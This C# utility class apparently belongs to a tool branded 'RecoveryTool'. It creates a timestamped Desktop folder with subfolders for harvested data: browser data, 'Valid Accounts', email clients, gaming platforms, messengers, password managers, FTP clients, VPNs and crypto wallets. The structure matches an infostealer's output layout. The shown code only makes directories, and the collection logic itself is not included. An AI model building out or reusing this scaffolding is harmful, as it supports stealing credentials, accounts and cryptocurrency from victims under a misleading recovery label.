namespace RecoveryTool.Recovery.Utilities
{
    internal static class Common
    {
        public static readonly string System = Environment.GetFolderPath(Environment.SpecialFolder.System);
        public static readonly string Desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
        public static readonly string UserProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
        public static readonly string Downloads = Path.Combine(UserProfile, "Downloads");
        public static readonly string LocalData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        public static readonly string AppData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        public static readonly string AppDataLow = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Low");
        public static readonly string CommonAppData = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);
        public static readonly string ProgramFiles = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
        public static readonly string ProgramFilesX86 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86);
        public static readonly string MyDocuments = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);

        public static readonly string recoveryBasePath = Path.Combine(Desktop, "Recovery");
        private static readonly string dateTimeFolder = DateTime.Now.ToString("(yyyy-MM-dd) HH;mm");

        internal static void InitializeRecoveryFolder()
        {
            CreateDirectoryIfNeeded(recoveryBasePath);
            CreateDirectoryIfNeeded(Path.Combine(recoveryBasePath, dateTimeFolder));
        }

        internal static string EnsurePath(string category, string subCategory = "")
        {
            string path = Path.Combine(category, subCategory);
            return CreateSubDirectory(path);
        }

        internal static string EnsureBrowsersRecoveryFilePath(string browserName, string fileName)
        {
            string path = EnsurePath("Browsers", browserName);
            return Path.Combine(path, fileName);
        }

        internal static string EnsureAccountValidationPath() => EnsurePath("Valid Accounts");
        internal static string EnsureMailbirdPath() => EnsurePath("Emails", "Mailbird");
        internal static string EnsureFoxMailPath() => EnsurePath("Emails", "FoxMail");
        internal static string EnsureOutlookPath() => EnsurePath("Emails", "Outlook");
        internal static string EnsureThunderbirdPath() => EnsurePath("Emails", "Thunderbird");
        internal static string EnsureGrowtopiaPath() => EnsurePath("Gaming", "Growtopia");
        internal static string EnsureMinecraftPath() => EnsurePath("Gaming", "Minecraft");
        internal static string EnsureRobloxPath() => EnsurePath("Gaming", "Roblox");
        internal static string EnsureBattleNetPath() => EnsurePath("Gaming", "BattleNet");
        internal static string EnsureEaPath() => EnsurePath("Gaming", "EA");
        internal static string EnsureEpicGamesPath() => EnsurePath("Gaming", "EpicGames");
        internal static string EnsureSteamPath() => EnsurePath("Gaming", "Steam");
        internal static string EnsureUbisoftPath() => EnsurePath("Gaming", "Ubisoft");
        internal static string EnsurePidginPath() => EnsurePath("Messenger", "Pidgin");
        internal static string EnsurePsiPath() => EnsurePath("Messenger", "Psi");
        internal static string EnsureDiscordPath() => EnsurePath("Messenger", "Discord");
        internal static string EnsureTelegramPath() => EnsurePath("Messenger", "Telegram");
        internal static string EnsureSlackPath() => EnsurePath("Messenger", "Slack");
        internal static string EnsureElementPath() => EnsurePath("Messenger", "Element");
        internal static string EnsureIcqPath() => EnsurePath("Messenger", "ICQ");
        internal static string EnsureSignalPath() => EnsurePath("Messenger", "Signal");
        internal static string EnsureViberPath() => EnsurePath("Messenger", "Viber");
        internal static string EnsureWhatsAppPath() => EnsurePath("Messenger", "WhatsApp");
        internal static string EnsureSkypePath() => EnsurePath("Messenger", "Skype");
        internal static string EnsureToxPath() => EnsurePath("Messenger", "Tox");
        internal static string EnsurePasswordManagerPath() => EnsurePath("Other", "Password Managers");
        internal static string EnsureCyberduckPath() => EnsurePath("FTP", "Cyberduck");
        internal static string EnsureFileZillaPath() => EnsurePath("FTP", "FileZilla");
        internal static string EnsureWinscpPath() => EnsurePath("FTP", "WinSCP");
        internal static string EnsureFileRecoveryPath() => EnsurePath("Data");
        internal static string EnsureHardwarePath() => EnsurePath("Hardware");
        internal static string EnsureNordVPNPath() => EnsurePath("VPNs", "NordVPN");
        internal static string EnsureOpenVPNPath() => EnsurePath("VPNs", "OpenVPN");
        internal static string EnsureProtonVPNPath() => EnsurePath("VPNs", "ProtonVPN");
        internal static string EnsureSharkVPNPath() => EnsurePath("VPNs", "SharkVPN");
        internal static string EnsureWalletsPath() => EnsurePath("Wallets", "Crypto");

        private static string CreateSubDirectory(string path)
        {
            string fullPath = Path.Combine(recoveryBasePath, dateTimeFolder, path);
            CreateDirectoryIfNeeded(fullPath);
            return fullPath;
        }

        private static void CreateDirectoryIfNeeded(string path)
        {
            if (!Directory.Exists(path)) Directory.CreateDirectory(path);
        }
    }
}
